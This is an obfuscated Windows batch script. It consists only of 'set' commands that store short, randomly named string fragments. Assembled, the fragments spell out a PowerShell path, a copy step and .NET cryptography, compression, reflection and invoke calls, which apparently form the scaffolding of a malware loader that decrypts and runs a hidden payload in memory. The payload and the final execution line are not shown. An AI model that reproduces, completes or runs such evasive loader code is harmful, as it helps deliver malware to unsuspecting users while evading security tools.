@echo off
set "AEbVNAZOBC=ws"
set "nDkHSHlfAK=\W"
set "UPfyFTMdpy=rs"
set "qkoxPUMLXE=xe"
set "LzQEyVOkgL=we"
set "iUDzIuEOkk=:\"
set "ACbrHYGYUY=ll"
set "djwujVXkEj=em"
set "rsPZBhbOxk=do"
set "DKPueQXtsj=ow"
set "KRKTRZXRuC=Po"
set "bUrjqXefUt=nd"
set "rkkGLQLVuX=in"
set "MlBAjsOORH= /"
set "YLSZzcoDWZ=po"
set "GFXPRbCODq=Wi"
set "kjuUyaOxwS=ll"
set "mQDhojFtuF=.e"
set "LASaDLUhrm=py"
set "nNiqmtRulW=y "
set "HPEKWAELon=co"
set "ahpESoDtiL=Sy"
set "RIZiLOfYrY=1."
set "qoldKBkljK=we"
set "gfWgFhNVHP=s\"
set "NKLyQCWTVU= C"
set "qzUQGVQDKb=st"
set "mScEAwcNRj=0\"
set "MOIQVmjtJe=\v"
set "jixftwvlBP=32"
set "RWtSmzIViB=he"
set "kvCAfgPZJI=he"
set "GxIqjMipSl=rS"
set "DysaQjTZqo= %~dp0"
set "vanVuRUeSk=cd"
set "TKFEzleTaf=3HWs"
set "aGXijLCsrl=$kiz"
set "UzrYUQfDSo= '')"
set "XELUGbPwgK=em.I"
set "BGKBWtSdnm= = N"
set "TjuoYVUJvD=Stre"
set "JSXQYNfNbA=join"
set "ToJimcPwVk=]::("
set "lBtUDnKlNO=Syst"
set "oyOdQTPlTq=('l0"
set "UMqvKDOVaT=ct S"
set "xTtWybXSan=nirt"
set "gkIHlunpAq=tem."
set "drXLPIhAWo=aXQ "
set "tilwHDWVhm= = $"
set "gSrctFKZKh=sion"
set "CMIAnHUIcg=e = "
set "WNqdNNnBeM=onve"
set "qXQEGtzUSM=n ''"
set "WVlNMimwvN=[Env"
set "PGRyyAvAvX=3); "
set "XnqvHBQnUg=;$Bv"
set "dbpkvUmHnm=w = "
set "MocrKDWgUq=m.IO"
set "wAtirPwIeB=rans"
set "qKjUrvqIoV=WObs"
set "FEfqegWIYZ='txe"
set "UZNZomDTKs=daeR"
set "KOluNouCGe=.Com"
set "aAVMtkeKFO=.Cre"
set "EzxJLqGurk=ZEp."
set "qMvqMUWwsV=wqO "
set "guyMYewtQv=le  "
set "qyqZzLjJLm=comm"
set "ljSeUMtcov=-joi"
set "qTvlfPohRn=, (,"
set "vGSHevcRhq='dqR"
set "LZiOtIVxyw=gth)"
set "FiYrXEIYWi=);$k"
set "QFyFZORpEV=embl"
set "zYGuBeEHdE=  $m"
set "tLNQZPKAvv=BC;$"
set "OwzFIOJXKA=::De"
set "WbYPOraTIX=Comp"
set "njHVxdRzyP=urit"
set "AOIeQJDWqB=Invo"
set "AFDWYjEjXq=+hAO"
set "poNrjBSCKg=Obje"
set "FcpQeZiidi=..-1"
set "aCedQhBgzs=raph"
set "WtdReKHKMs=rt]:"
set "symboExuju=ptor"
set "KWgspnzlER=Ep, "
set "nmZRwzqUrH=am;$"
set "molayYGlfc=:: '"
set "JFesaXwuQe=yste"
set "tmEieKVXaJ=ion."
set "WzpJuYKJVE=kDZE"
set "BWgEItteKI=-joi"
set "bUPtmDZNLZ=UGTu"
set "APYZTIgNFZ=Obje"
set "DxxKENDRyE=m.Re"
set "xmLUNfrukc=7;$e"
set "dequklPYNF=);$W"
set "oQYYDVWSfN=bstr"
set "NEDaOmjgaG=w, 0"
set "GxbHztKrRj=oArr"
set "iGCtZEKHwv=-4] "
